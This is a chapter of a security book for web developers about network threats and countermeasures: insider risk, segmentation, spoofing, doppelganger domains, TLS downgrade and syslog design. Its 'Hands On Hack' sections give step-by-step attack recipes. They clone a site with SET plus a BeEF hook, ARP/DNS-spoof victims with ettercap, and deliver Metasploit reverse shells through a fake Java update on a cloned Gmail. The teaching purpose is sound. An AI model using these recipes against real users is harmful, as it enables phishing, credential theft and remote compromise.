# 8. Network {#network}

![10,000' view of Network Security](images/10000Network.png)

## 1. SSM Asset Identification
Take results from the higher level Asset Identification section of the 30,000' View chapter of [Fascicle 0](https://leanpub.com/holistic-infosec-for-web-developers). Remove any that are not applicable. Add any newly discovered.

Here are some possibilities to get you started:

* Switches: Mainly because of the data that passes through them.
* Routers and layer 3 switches: Same as above, plus there will be a lot of sensitive network related information stored here.
* Syslog servers: For similar reasons to routers, plus events and sensitive information from all sorts of systems collected in one place.

There will almost certainly be many others. Think about your network topology. What information is stored where and over which channels it may pass. If you have decided to hand your precious data over to a Cloud Service Provider (CSP), then you are not going to have much control over this and in most cases, your CSP will not have as much control as you would like either, we address this in the [Cloud](#cloud) chapter. Also think about the areas that may be easier to compromise than others and take this information into the next step.

## 2. SSM Identify Risks
Go through the same process as we did at the top level Identify Risks section in the 30,000' View chapter of [Fascicle 0](https://leanpub.com/holistic-infosec-for-web-developers), but for the network.

* [MS Network Threats and Countermeasures](https://msdn.microsoft.com/en-us/library/ff648641.aspx#c02618429_006)

Most types of security exploitation have a network involved somewhere. Reconnaissance generally utilises the internet at a minimum. [Application security](#web-applications) generally requires a network in order to access the target application(s). [Cloud security](#cloud) similarly depends on a network in order to access the target resources. Social Engineering as discussed in [Fascicle 0](https://leanpub.com/holistic-infosec-for-web-developers) leverages a network of people in order to access the human target. Even physical security (also discussed in [Fascicle 0](https://leanpub.com/holistic-infosec-for-web-developers)) often involves different types of networks. When we think of networks, try not to be constrained to computer networks.

_Todo_: Add SER interview for Network Security

### Fortress Mentality

This section takes the concepts from the section with the same name from the Physical chapter in [Fascicle 0](https://leanpub.com/holistic-infosec-for-web-developers/). The largest percentage of successful attacks come from within organisations. Usually the inside attacks get covered up, because the public image of the organisation is affected to a greater extent than if the organisation publicises the fact that they were compromised by someone on the other side of the world.

There is somehow still a misnomer that having perimeters will save us from the attackers. They may stop some of the noise from unmotivated attackers, but usually not a lot more.

IBM X-Force [2016 Cyber Security Intelligence Index](http://ibm.biz/2016CyberIndex) provides the following information for 2014 and 2015, plus a lot more:

**2014**:

Industries that experienced the highest incident rates were as listed descending:

1. Financial services
2. Information and communication
3. Manufacturing
4. Retail and wholesale
5. Energy and utilities

* 55% of all attacks were carried out by insiders
* 31.5% were malicious inside actors
* 23.5% were inadvertent inside actors

**2015**:

Industries that experienced the highest incident rates were as listed descending:

1. Healthcare
2. Manufacturing
3. Financial services
4. Government
5. Transportation

* 60% of all attacks were carried out by insiders
* 44.5% were malicious inside actors
* 15.5% were inadvertent inside actors

The 2017 IBM X-Force [Threat Intelligence Index](https://public.dhe.ibm.com/common/ssi/ecm/wg/en/wgl03140usen/WGL03140USEN.PDF) provides the following information for 2016, plus a lot more:

Industries that experienced the highest incident rates were as listed descending:

1. Financial services
2. Information and communications
3. Manufacturing
4. Retail
5. Healthcare

In 2017 X-Force segregated the data. in **2016**:

* 30% of all attacks were carried out by insiders
* 7% were malicious inside actors
* 23% were inadvertent inside actors

In saying that, Financial services was:

* 58% of all attackers were carried out by insiders
* 5% were malicious inside actors
* 53% were inadvertent inside actors

Healthcare was:

* 71% of all attackers were carried out by insiders
* 25% were malicious inside actors
* 46% were inadvertent inside actors

Malicious inside actors can be disgruntled employees that may or not have left the organisation and still have access via an account or a back door they introduced or know about, they could also be opportunists looking to make some extra money by selling access or private information.

An inadvertent inside actor is usually someone that does not mean to cause harm, but falls prey to social engineering tactics often from malicious outsiders, as touched on in the People chapter of [Fascicle 0](https://leanpub.com/holistic-infosec-for-web-developers/). These are attacks such as phishing, or somehow being tricked or coerced into revealing sensitive information or carrying out an activity that will provide the attacker a foothold. The Social Engineer's Playbook by Jeremiah Talamantes has many very useful and practical examples.

In all cases in 2016, we saw a significant trend of the inside actors shifting to the inadvertent, essentially this points to an emphasis on exploiting the organisations people (social engineering) with various attack strategies.

This clearly shows, that although our technological defences are improving slowly, our people are much slower to improve. Spending resources on areas such as network perimeters while neglecting our most valuable assets (our people), does not make sense.

Often workers bring their own devices to work, and bring their work devices home and back, potentially transferring malware from network to network, whether they be wired or wireless. Again though, people are the real issue here. No matter how good your technological solution is, people will circumvent it.

### Lack of Segmentation {#network-identify-risks-lack-of-segmentation}

Similar to the "[Overly Permissive File Permissions, Ownership and Lack of Segmentation](#vps-identify-risks-unnecessary-and-vulnerable-services-overly-permissive-file-permissions-ownership-and-lack-of-segmentation)" section in the VPS chapter, here we focus on the same concept but at the network layer.

Network segmentation is the act of splitting a network of computers that share network resources into multiple sub networks, whether it be real via routers, layer three switches, or virtual via VLANs.

Without segmentation, attackers once on the network have direct access to the resources on that network.

Having all or many resources from different trust boundaries on a monolithic network does nothing to constrain attackers or the transfer of malware. When we talk about trust boundaries we are talking about a configured firewall rather than just a router. A router routes, a firewall should deny or drop everything other than what you specify. That is right, it requires some thought of what should be allowed to enter the gateway interface and how it is then treated.

A good example of lack of segmentation is what is currently happening with the explosion of IoT devices. Why would your house-hold appliances need to be on the internet other than to perform unnecessary tasks, like a fridge ordering food, or an oven being able to tell you when your dinner is cooked, or worse, providing functionality to turn the appliance on and off, or worse still, being [commandeered by attackers](http://www.mirror.co.uk/news/technology-science/technology/hackers-use-fridge-send-spam-3046733#) to do their bidding which is quite common now for home appliances that have next to no consciousness of security. Even if these functions were considered important enough to reveal open sockets from your home to the internet, surely it would be much safer to have these devices on a network segment with the least of privileges available, tight egress filtering, encrypted communications, and someone that knows how to configure the firewall rules on the segments gateway.

### Lack of Visibility

%% Start here ...................................................











Check the Lack of Visibility from VPS chapter, there will be some cross over.

#### Insufficient Logging

_Todo_

#### Lack of Network Intrusion Detection Systems (NIDS)

_Todo_



### Spoofing {#network-identify-risks-spoofing}

Spoofing on a network is the act of an entity (often malicious(Mallory), [but not necessarily](http://blog.binarymist.net/2015/04/25/web-server-log-management/#mitm)) successfully masquerading/impersonating another (Bob) in order to receive information from Alice (sometimes via Eve) that should then reach Bob.

The following are some of the different types of network spoofing 

#### [IP](http://en.wikipedia.org/wiki/IP_address_spoofing) {#network-identify-risks-spoofing-ip}
![](images/ThreatTags/easy-common-average-severe.png)

Setting the IP address in your header to the victims IP address.

Remember we did something similar to this under the "Concealing NMap Source IP Address" of the Reconnaissance section from the Process and Practises chapter in [Fascicle 0](https://leanpub.com/holistic-infosec-for-web-developers) with nmap decoy host `-D` and idle scan `-sI`.

This is where a sending node will spoof its public IP address (not actually change its IP address) (by forging the header) to look like someone else's. When the message is received and a reply crafted, the entity creating the reply will look up its ARP table and send the reply to the impersonated entity because the MAC address is still associated with the IP address of the message it received. This sort of play is commonly used in Denial of Service (DoS) attacks, because the attacker does not need or want the response.

In a Distributed DoS (D-DoS) Often the attacker will impersonate the target (often a router or some server it want to be brought to its knees) and broadcast messages. The nodes that receive these messages consult their ARP tables looking up the spoofed IP address and find the targets associated MAC address and reply to it. This way the replies will be sourced from many nodes. Thus swamping the targets network interface.  
Many load testing tools also use this technique to stress a server or application.

#### ARP (Address Resolution Protocol) {#network-identify-risks-spoofing-arp}
![](images/ThreatTags/easy-common-average-severe.png)

Telling your target that the MAC address it associates with a particular legitimate node (by way of IP address) is now your (the attackers/MItM) MAC address.

Taking the IP spoofing attack further. The MItM sends out ARP replies across the LAN to the target, telling it that the legitimate MAC address that the target associates with the MItM box has now changed to say the routers IP address. This way when the target wants to send a message to say the router, it looks up its ARP table for the routers IP address in order to find its MAC address and now gets the MItM MAC address for the routers IP address, thus the targets ARP cache is said to be poisoned with the MItM MAC address. The target goes ahead and sends its messages to the MItM box which can do what ever it likes with the data. Choose to drop the message or to forward it on to the router in its original or altered state.  
This attack only works on a LAN.  
The attack is often used as a component of larger attacks, harvesting credentials, cookies, CSRF tokens, hijacking. Even using TLS (in many cases TLS can be [downgraded](#network-identify-risks-tls-downgrade)). 

There is a complete cloning example of a website, ARP spoof, DNS spoof and hands on hack, in the [website section below](#network-identify-risks-spoofing-website).

* [MItM with ARP spoofing](http://blog.binarymist.net/2015/04/25/web-server-log-management/#mitm)
* [With TLS](http://frishit.com/tag/ettercap/)

#### DNS {#network-identify-risks-spoofing-dns}
![](images/ThreatTags/difficult-uncommon-average-severe.png)

Affects any domain name lookup. That includes email.
This type of attack could allow an intermediary to intercept and read all company emails for example. Completely destroying any competitive advantage. The victim may never know it is happened.  
DNS spoofing refers to an end goal rather than a specific type of attack. There are many ways to spoof a name server.

* Compromise the name server itself potentially through it is own vulnerabilities ([Kaminsky bug](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-1447) for example)
* Poison the cache of the name server
* Poison the cache of an upstream name server and wait for the downstream propagation
* MItM attack. A good example of this is:
  * cloning a website you hope your victim will visit
  * offering a free Wi-Fi hot-spot attached to your gateway with DNS server provided.
 Your DNS server provides your cloned website IP address. You may still have to deal with X.509 certificates though, unless the website enforces TLS across the entire site, which is definitely my recommendation. If not, and the potential victim already has the websites certificate they are wanting to visit in their browser, then you will have to hope your victim will click through the warning or work out a TLS downgrade which is going to be harder.

There is a complete cloning example of a website, ARP spoof, DNS spoof and hands on hack, in the [website section below](#network-identify-risks-spoofing-website)

[dnschef](http://www.question-defense.com/2012/12/14/dnschef-backtrack-privilege-escalation-spoofing-attacks-network-spoofing-dnschef) is a flexible spoofing tool, also available in Kali Linux. Would be interesting to test on the likes of Arpon and Unbound.

#### Referrer {#network-identify-risks-spoofing-referrer}
![](images/ThreatTags/easy-common-average-moderate.png)

This comes under the [OWASP Top 10 A7 Missing Function Level Access Control](https://www.owasp.org/index.php/Top_10_2013-A7-Missing_Function_Level_Access_Control)

Often websites will allow access to certain resources so long as the request was referred from a specific page defined by the `referer` header.  
The referrer (spelled `referer`) field in HTTP requests can be intercepted and modified, so it is not a good idea to use it for authentication or authorisation. The Social Engineering Toolkit (SET) also exploits the `referer` header, as discussed in the hands on hack within the Spear Phishing section of Identify Risks in the People chapter of Fascicle 0.

![](images/HandsOnHack.png)

_Todo_

#### EMail Address {#network-identify-risks-spoofing-email-address}
![](images/ThreatTags/easy-widespread-average-moderate.png)

The act of creating and sending an email with a forged sender address.
This is useful for spam campaigns sending large numbers of email and for social engineers often sending small numbers of email. The headers can be specified easily on the command line. The tools used essentially modify the headers: `From` and `Reply-To`.
<!--Useful inof on the From, Reply-To and Return-Path fields http://stackoverflow.com/questions/1235534/what-is-the-behavior-difference-between-return-path-reply-to-and-from-->
The Social Engineer Toolkit (SET) can be handy for sending emails that appear to be from someone the receiver expects to receive email from. Set is capable of doing many tasks associated with social engineering. It even provides the capability to create executable payloads that the receiver may run once opening the email. Payloads in the form of a pdf with embedded exe, which Set allows you to choose form having Set do all the work for you, or you supplying the custom payload and file format.

Most people just assume that an email they have received came from the address it appears to be sent from. The Email headers are very easy to tamper with.
Often other types of spoofing attacks are necessary in order to have the `From` and `Reply-To` set to an address that a victim recognises and trusts rather than the attackers address or some other obviously obscure address.

There are also [on-line services](http://www.anonymailer.net/) that allow the sending of email and specifying any from address.

Often the sender of a spoofed email will use a from address that you recognise in hope that you will click on a link within the email thus satisfying their phish.

#### Website {#network-identify-risks-spoofing-website}
![](images/ThreatTags/difficult-common-average-severe.png)

<!---Todo: Check out Subterfuge, mentioned in "Basic Security Testing With Kali Linux"-->
<!---Todo: pg 160 of "The Hacker Playbook" could be worth demoing here-->
An attacker can clone a legitimate website (with the likes of the Social Engineering Kit (SET)) or the Browser Exploitation Framework (BeEF) and through social engineering, phishing, email spoofing or any other number of tricks (as discussed in the People chapter of [Fascicle 0](https://leanpub.com/holistic-infosec-for-web-developers)), coerce a victim to browse the spoofed website. In fact, if you clone a website that you know your victim visits regularly, then you can just do that and sit and wait for them to take the bait. Better still automote your attack so that when they do take the bait exploits are fired at them automatically. Once the victim is on the spoofed website, the attacker can harvest credentials or carry out many other types of attacks against the non-suspecting user.

The victim may visit the attackers cloned website due to ARP and/or DNS spoofing. Subterfuge is handy to run a plethora of attacks against the victims browser through the likes of the Metasploit Browser AutoPwn module. If >0 attacks are successful (we have managed to install a root-kit), the attacker will usually get a remote command shell to the victims system by way of reverse or bind shell. Then simply forward them onto the legitimate website without them even being aware of the attack.

{#wdcnz-demo-3}
![](images/HandsOnHack.png)

The following attack was one of five that I demonstrated at WDCNZ in 2015. The two leading up to this one provide some context and it is probably best to look at them first if you have not already.

You can find the video of how it is played out at [http://youtu.be/ymnqTrnF85M](http://youtu.be/ymnqTrnF85M).

I> ## Synopsis
I>
I> The average victim will see a valid URL and the spoof will be undetectable.  
I> Use a website that you know victim is likely to spend some time at. This can make it easier if you are running exploits manually in BeEF.  
I> Can be used to obtain credentials or simply hook with BeEF and run any number of exploits.  
I> SET would be run on the website you want to clone. As SET only gets the index file, you will have to use the likes of `wget` to get any other missing resources you need to complete the website. Static sites are obviously the easiest. We do not really want to have to create a back-end for the cloned website. You may have to update some of the links to external resources as well in the index.html file that SET creates.  
I> Ideally you will have cleaned out the public web directory that apache hosts from `/var/www/`. If you do not, I think SET archives everything in there.  
I> You can also leverage ARP and DNS spoofing with Ettercap.

{icon=bomb}
G> ## The Play
G>
G> Run `setoolkit`
G>
G> Choose:  
G> `2) Website Attack Vectors`
G>
G> `3) Credential Harvester Attack Method`
G>
G> `2) Site Cloner`
G>
G> Enter the IP address you want to host from. This will probably be the machine you are running these commands from. Although you could host anywhere.
G>
G> Enter the URL to clone.
G>
G> `y` to start apache.
G>
G> Here you will need to either `wget` any files your missing if you are missing some, or if there are only a small number, just grab them out of your browser developer tools.
G>
G> Add the BeEF hook (`<script src="http://<BeEF comms server IP address>:3000/hook.js"></script>`) into the index.html in `/var/www/` usually at the end of the body, just before the `</body>` tag.
G>
G> From the directory that you have BeEF installed, run the BeEF ruby script: `./beef`
G>
G> Add an 'A' record of the website you ave just cloned and want to spoof into ettercaps dns file: `echo "<domainname-you-want-to-clone.com> A <IP address that is hosting the clone>" >> /etc/ettercap/etter.dns`
G>
G> Now run ettercap which is going to both ARP and DNS spoof your victim and the victims gateway with the MItM option, using dns_spoof plugin: `ettercap -M arp:remote -P dns_spoof -q -T /<gateway IP address>/ /<victim IP address>/`.
G>
G> You can now log into the BeEF web UI.
G>
G> Now when the victim visits your cloned web site, the URL will look legitimate and they will have no idea that their browser is a BeEF zombie continually asking it is master (the BeEF communications server) what to execute next.

T> ## BeEF Can Also Clone
T>
T> BeEF can also be used to clone web sites using its REST API, but it takes more work. The below on using BeEF to do this is only if you really have to.
T>
T> In order to clone, once you have BeEF running:  
T> `curl -H "Content-Type: application/json: charset=UTF-8" -d '{"url":"http://<domainname-you-want-to-clone.com>", "mount":"/"}' -X POST http://127.0.0.1/api/seng/clone_page?token=<token that BeEF provides when you start it up each time>;`  
T> The loop-back IP address is just the address that the BeEF REST API is listening on.  
T> When you run this command, you should get back:  
T> `{"success":true,"mount":"/"}`,  
T> BeEF should also say that it is cloning page at URL:  
T> `http://<domainname-you-want-to-clone.com>` with other information.  
T>
T> As with SET, if any resources other than a single index.html are required,
then they also have to be acquired separately. With BeEF, they need to be copied into:  
T> `/usr/share/beef-xss/extensions/social_engineering/web_cloner/cloned_pages/`.  
T> Routes have to be created in:  
T> `/usr/share/beef-xss/extensions/social_engineering/web_cloner/interceptor.rb`  
T> and also modified to add new [config "hook"](http://sourceforge.net/p/piwat/WAT-Pentoo/ci/6402fce4c6966639927acb72c516edd203c41b77/tree/bin/beef/extensions/social_engineering/web_cloner/web_cloner.rb#l17),  
T> also added to `/usr/share/beef-xss/config.yaml`.  
T> Within the same config.yaml file `host` seems to serve two purposes. The address to access beef and where to fetch hook.js from. If I use an external address, beef only listens on the external interface (can not reach via loopback). So I added a `hook` config which is the address that the beef communications server is listening on that gets inserted into the cloned web page.

{#wdcnz-demo-4}
![](images/HandsOnHack.png)

The following attack was the fourth of five that I demonstrated at WDCNZ in 2015. The [previous demo](#wdcnz-demo-3) will provide some additional context and it is probably best to look at it first if you have not already.

You can find the video of how it is played out at [http://youtu.be/WSwqNb_94No](http://youtu.be/WSwqNb_94No).

I> ## Synopsis
I>
I> This demo differs from the previous in that the target will be presented with a Java "needs to be updated" pop-up. When the target plays along and executes what they think is an update, they are in fact starting a reverse shell to the attacker.  
I> The website you choose to clone does not have to be one that the attacker spends much time on. All that is needed is for the attacker to have done their reconnaissance and know which web sites the target frequently visits. Clone one of them. Then wait for the target to fetch it. Then succumb to the attackers bait by clicking the "Update" or "Run this time" button.  
I> You can also leverage ARP and DNS spoofing with Ettercap from the previous attack. I have not included these steps in this play though, although the video assume they have been included.

{icon=bomb}
G> ## The Play
G>
G> Start postgresql:  
G> `service postgresql start`
G>
G> Start the Metasploit service:  
G> `service metasploit start`
G>
G> Start the Social Engineering Toolkit:  
G> `setoolkit`
G>
G> Choose:  
G> `1) Social-Engineering Attacks`
G>
G> `2) Website Attack Vectors`
G>
G> `6) Multi-Attack Web Method`
G>
G> `2) Site Cloner`
G>
G> Do not need NAT/Port forwarding.
G>
G> Enter the IP address that Metasploit will be listening on. That is the IP address that you are launching the attack from.
G>
G> Enter `https://gmail.com` as the URL to clone.
G>
G> Turn on `1. Java Applet Attack Method` & `2. Metasploit Browser Exploit Method`.  
G> Proceed with the attack.  
G> The website is now cloned.  
G>
G> Select the vulnerabilities to exploit: `2) Meterpreter Multi-Memory Injection`.  
G>
G> Select the payloads to deliver. Select them all.  
G> Confirm Port 443 to help disguise the reverse connection as legit.  
G> The payloads are now encrypted and the reverse shells configured.  
G>
G> Take the easy option of `(2) Java Applet`
G>
G> Select `Metasploit Browser Autopwn` for the Java Applet browser exploit.  
G> The cloned site is hosted -> msfconsole is started.
G>
G> Target fetches our spoofed gmail.  
G> Oh… we have a Java update.  
G> Now we know we are always supposed to keep our systems patched right?  
G> Better update.
G>
G> Anti-virus (AV) says we are all safe. Must be all good.  
G> A PowerShell exploit fails.  
G>
G> Here come the shells.  
G> Interact with the first one:
G> `sessions -i 1`
G>
G> Attempt to elevate privileges:  
G> `getsystem`  
G> Does not work on this shell.

{icon=bomb}
G> Let us list the available meterpreter extensions to make sure we have `priv`.  
G> `use -l`  
G> and priv is in the list.  
G> Now that we know we have [priv](https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/), we can:
G>
G> `run bypassuac`  
G> Now that is successful, but AV detects bad signatures on some of the root-kits. On this shell I only got the privileges of the target running the browser exploit.

### Data Exfiltration, Infiltration leveraging DNS

_Todo_

%% This may also work for exfiltration TCP over HTTP https://github.com/derhuerst/tcp-over-websockets

%% https://github.com/Crypt0s/FakeDns

### Doppelganger Domains {#network-identify-risks-doppelganger-domains}

Often domain consumers (people: sending emails, browsing websites, SSHing, etc) miss type the domain. The most common errors are leaving '.' out between the domain and sub domain. Even using incorrect country suffixes. Attackers can take advantage of this by purchasing the miss typed domains. This allows them to intercept requests with: credentials, email and other sensitive information that comes their way by unsuspecting domain consumers.

#### Web-sites {#network-identify-risks-doppelganger-domains-websites}
![](images/ThreatTags/easy-common-average-moderate.png)

Useful for social engineering users to a spoofed web-site. The attacker may not be able to spoof the DNS entries, although this is the next best thing. For example `accountsgoogle.co.nz` could look reasonably legitimate for a New Zealand user intending to sign into their legitimate google account at `accounts.google.com`. In fact at the time of writing, this domain is available. Using the methods described in the Website section to clone and host a site and convince someone to browse to it with a doppelganger domain like this is reasonably easy.

![](images/accountsgoogle-available0.jpg)

![](images/accountsgoogle-available1.jpg)

#### SMTP {#network-identify-risks-doppelganger-domains-smtp}
![](images/ThreatTags/average-common-difficult-moderate.png)

1. By purchasing the doppelganger (miss typed) domains
2. configuring the mail exchanger (MX) record
3. setting up an SMTP server to catch all
    1. record
    2. modify the to address to the legitimate address
    3. modify the from address to the doppelganger domain that the attacker owns (thus also intercepting the mail replies)
    4. forward (essentially MItM).

The attacker gleans a lot of potentially sensitive information.

#### SSH {#network-identify-risks-doppelganger-domains-ssh}
![](images/ThreatTags/average-common-difficult-severe.png)

Less traffic, but if/when compromised, potentially much larger gains. You do not get better than shell access. Especially if they have not disallowed root.

Setup the DNS A record value to be the IP address of the attackers SSH server and the left most part of the name to be "*", so that all possible substitutions that do not exist (not just that do not have any matching records) will receive the attackers SSH server IP address. The DNS wild-card rules are complicated.

An SSH server needs to be set-up to record the user-names and passwords. The OpenSSH code needs to be modified in order to do this.

![](images/HandsOnHack.png)

### Wrongfully Trusting the Loading of Untrusted Web Resources {#network-identify-risks-wrongfully-trusting-the-loading-of-untrusted-web-resources}
![](images/ThreatTags/average-verywidespread-easy-moderate.png)

By default, the browser allows all resources from all locations to be loaded. What would happen if one of those servers was compromised or an attacker was tampering with the payload potentially changing what was expected for something malicious to be executed once loaded? This is a very common technique for attackers wishing to get their malicious scripts into your browser.

### TLS Downgrade {#network-identify-risks-tls-downgrade}
![](images/ThreatTags/average-common-average-severe.png)

When ever a user browses to a HTTPS website, there is the potential for an attacker to intercept the request before the TLS handshake is made, and if the web server accepts an unencrypted request, redirect the user to the same website but without the TLS.

This is a danger for all websites that do not enforce TLS for every page, or better, at the domain level. For example many websites are run over plain HTTP until the user wants to log-in. At which point the browser issues a request to an HTTPS resource that is listed on an unencrypted page. These requests can easily be intercepted and the attacker change the request to HTTP so that the TLS handshake is never made.

[https://httpswatch.nz](https://httpswatch.nz) is an excellent resource for some of the prominent websites in New Zealand, informing them of the issues in regards to HTTPS health.

### Firewall/Router {#network-identify-risks-firewall-router}

Routing Configurations. Discuss egrees which is often neglected

_Todo_

%% Mention that we touched on Routing Firewalls in the Lack of Segmentation section, and that there is a distinct difference between the functions of a router and a firewall

### Wire Inspecting {#network-identify-risks-wire-inspecting}

_Todo_

%% obtaining hashes, discussed in "0wn1ng The Web" talk.

### Wi-Fi

_Todo_ Discuss and detail some wireless exploits. Specifically at least some of the WPS vectors discussed in the Physical chapter. Plus hopefully some more.

%% Can we crack WPA2? Provide quick overview of how it can be done or at least the likes of WEP.
%% Crunch generates every possible combination of characters you tell it too
%% https://forums.kali.org/showthread.php?18261-Cracking-WPA-key-with-crunch-aircrack-(almost-fullproof-but-how-speed-things-up)
%% http://adaywithtape.blogspot.co.nz/2011/05/creating-wordlists-with-crunch-v30.html
%% http://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-passwords-part-4-creating-custom-wordlist-with-crunch-0156817/

### Using Components with Known Vulnerabilities

_Todo_
https://www.owasp.org/index.php/Top_10_2013-A9-Using_Components_with_Known_Vulnerabilities








## 3. SSM Countermeasures {#network-countermeasures}

* [MS Network Threats and Countermeasures](https://msdn.microsoft.com/en-us/library/ff648641.aspx#c02618429_006)

### Fortress Mentality {#network-countermeasures-fortress-mentality}

This section takes the concepts from the section with the same name from the Physical chapter in [Fascicle 0](https://leanpub.com/holistic-infosec-for-web-developers/).

Once we get over the fact that we are no longer safe behind our firewalls, we can start to progress in terms of the realisation that our inner components: services, clients, communications will be attacked, and we need to harden them.

Our largest shortcoming continues to be our people falling victim to common social engineering attacks. I've spoken about this in [Fascicle 0](https://leanpub.com/holistic-infosec-for-web-developers/), so please refer to that if you have not already read it.

The organisation needs to decide and enforce their own policies, just as you do for your own personal devices and network(s).

The organisation could decide to not allow any work devices to be taken from the premises.

Another option is to actually help their workers be more secure with everything in their lives that have the potential to impact the business. What effects the workers impacts the business.

Have a separate wireless network for your visitors and workers to access the internet.

In terms of technology, most of the VPS chapter was focussed on removing services that are not needed and hardening those that are, with the intention that your corporate network is almost as good as being directly on the internet without a perimeter anyway.

Once you have made sure your listening services are patched and you are only using security conscious services, your communications between services are encrypted, then technology wise, you are doing well.

For file and data sharing from machine to machine no matter where they are, and also from software client to service you can use the likes of Tresorits offerings:

* [Tresorit](https://tresorit.com/) for encrypted file storage for as many people as need it, with about as much configurability as you can dream of
* [Tresorit ZeroKit SDK](https://tresorit.com/zerokit) User authentication and end-to-end encryption for Android, iOS and JavaScript applications

### Lack of Segmentation  {#network-countermeasures-lack-of-segmentation}

By creating network segments containing only the resources specific to the consumers that you authorise access to, you are creating an environment of [least privilege](#web-applications-countermeasures-management-of-application-secrets-least-privilege), where only those authorised to access resources can access them.

For example, if you felt it was essential for your kitchen appliances to be able to talk to the internet, then put them all on a separate network segment, and tightly constrain their privileges.

By segmenting a network, it creates a point of indirection that the attacker has to attempt to navigate passage through. Depending on how the gateway is configured, depends how difficult and time consuming it is to traverse.

Network segmentation has the potential to limit damage to the specific segment affected.

PCI-DSS provides guidance on why and how to reduce your compliance scope, much of this comes down to segmenting all card holder data from the rest of the network.

I spoke a little about host firewalls in the VPS chapter. In regards to network firewalls, they play an important role in allowing (white listing) only certain hosts, network segments, ports, protocols, etc into any given gateways network interface.

Logging, alerting, IDS/IPS play an important part in monitoring, providing visibility and even preventing some network attacks. They were discussed in the context of hosts in the VPS chapter and similarly apply to networking, we will address these in the next section. 

**Component Placement**

Some examples of how and where you could/should place components:

Servers that need to serve the World Wide Web, should be on a demilitarisation zone (DMZ). Your organisations corporate LAN should only have network access to the DMZ in order to perform administrative activities at the most, SSH and possibly port 443. It is also a good idea to define which host IP addresses should be allowed traversal from the LAN gateway interface. In some cases even network access is locked down and physical access is the only way to access DMZ resources. The DMZ gateway interface should have rules to only allow what is necessary to another network segment as discussed briefly in the [VPS chapter](#vps-countermeasures-preparation-for-dmz), for example:

* To data-stores if necessary
* For [system updates](#vps-countermeasures-using-components-with-known-vulnerabilities)
* DNS if necessary. Also review the sections on DNS spoofing and Data Exfiltration leveraging DNS later in this chapter
* To a syslog server, [as discussed](#network-countermeasures-lack-of-visibility-insufficient-logging) later in this chapter and also in the [VPS chapter](#vps-countermeasures-lack-of-visibility-logging-and-alerting)
* Access to [time server](#network-countermeasures-fortress-mentality-insufficient-logging-ntp) (NTP)

Consider putting resources like data-stores in a secluded segment. VLAN or physical, but isolate them as much as possible.

Also consider using [Docker containers](#vps-countermeasures-docker) which provide some free isolation.

### Lack of Visibility












_Todo_ Add Security Onion Linux distro as an IDS, Network Security Monitoring (NSM) and log management.

%% https://securityonion.net/#about
%% https://github.com/Security-Onion-Solutions/security-onion/wiki/IntroductionToSecurityOnion

%% https://packages.debian.org/wheezy/harden-surveillance

%% http://www.kitploit.com/2015/11/security-onion-linux-distro-for.html
%% http://blog.securityonion.net/p/securityonion.html
%% http://www.sans.org/reading-room/whitepapers/detection/logging-monitoring-detect-network-intrusions-compliance-violations-environment-33985
%% http://www.unixmen.com/security-onion-linux-distro-ids-nsm-log-management/

#### Insufficient Logging {#network-countermeasures-lack-of-visibility-insufficient-logging}

If you think back to the Web Server Log Management countermeasures section in the VPS chapter, we outlined an [Environmental Considerations](#vps-countermeasures-lack-of-visibility-web-server-log-management-environmental-considerations) section, in which I deferred to this section, as it made more sense to discuss alternative device system logging such as routers, layer 3 switches, in some cases layer 2 switches, data-store, and file servers here in the Network chapter rather than under VPS. Let us address that now. 

**Steps in order of dependencies**

![](images/NetworkSysloging.png)

None of these are ideal, as UDP provides no reliable messaging and it is crucial that "no" system log messages are lost, which we can not guarantee with UDP. Also with some network components, we may not be able to provide confidentiality or integrity of messages over the wire from network appliances that only support UDP without TLS (DTLS), a VPN, or any type of encryption. This means we can no longer relly on our logs to provide the truth. The best case below still falls short in terms of reliability, as the test setup used pfSense which only supports sending syslogs via UDP. The best you could hope for in this case is that there is not much internal network congestion, or find a router that supports TCP at a minimum.

**Steps with details**

1. As per the PaperTrail set-up we performed in our test lab
2.    
  * Create persistence of FreeNAS syslogs, as currently they are lost on shutdown because FreeNAS runs entirely in RAM
        * Create a dataset called "syslog" on your ZFS zpool and reset.
  * (Option **first choice**, for pfSense)
        * Create a jail in FreeNAS, [install OpenVPN in the jail](https://forums.freenas.org/index.php?threads/how-to-install-openvpn-inside-a-jail-in-freenas-9-2-1-6-with-access-to-remote-hosts-via-nat.22873/), install rsyslogd in the jail and configure it to accept syslog events via UDP as TCP is not supported, from the host and the remote hosts, and forward them on via TCP(possibly with RELP)/TLS to the external syslog aggregator.
  * (Option **second choice**) Receive syslogs from local FreeNAS and other internal appliances that only send using UDP (pfSense in our example lab, and possibly layer 3 (even 2) switches and APs) and possibly some appliances that can send via TCP.
        * Download and run [SyslogAppliance](http://www.syslogappliance.de/en/) which is a turn-key VM for any VMware environment. SyslogAppliance is a purpose built slim Debian instance with [no sshd installed](http://www.syslogappliance.de/download/syslogappliance-0.0.6/README.txt), that can receive syslog messages from many types of appliances, including routers, firewalls, switches, and even Windows event logs via UDP and TCP. SyslogAppliance also [supports TLS](http://www.syslog.org/forum/profile/?area=showposts;u=29) and comes preconfigured with rsyslog and [LogAnalyzer](http://loganalyzer.adiscon.com/), thus providing [log analysis and alerting](http://www.syslogappliance.de/en/features.php). This means step 3 is no longer required, as it is being performed by LogAnalyzer. This option could also store its logs on an iSCSI target from FreeNAS.
  * (Option **third choice**) Receive syslogs from local FreeNAS and other internal appliances that only send using UDP (pfSense in our example lab, and possibly layer 3 (even 2) switches and APs).
        * The default syslogd in FreeBSD doesn't support TCP.
        * Create a jail in FreeNAS, install rsyslogd in the jail and configure it to accept UDP syslog messages and then forward them on via TCP(possibly with RELP)/TLS.
3.    
  * (Option **first choice** for pfSense) UDP, as TCP is not available.
        * In the pfSense Web UI: Set-up a vpn from site 'a' (syslog sending IP address) to site 'b' (syslog receiving IP address / remote log destination).
        * Then in Status -> System Logs -> Settings -> Remote Logging Options, add the `IP:port` of the listening VPN server, which is hosted in the FreeBSD jail of the rsyslogd server (FreeNAS in this example) into one of the "Remote log servers" input boxes. The other option here is to send to option second choice of step two (SyslogAppliance).
        * Your routing table will take care of the rest.
  * (Option **second choice**)
        * Configure syslog UDP only appliances to forward their logs to the rsyslogd in the jail (option third choice of step two), or to option second choice of step two (SyslogAppliance).
                
There are also a collection of [Additional Resources](#additional-resources-network-insufficient-logging-internal-network-system-logging) worth looking at.

##### Network Time Protocol (NTP) {#network-countermeasures-fortress-mentality-insufficient-logging-ntp}

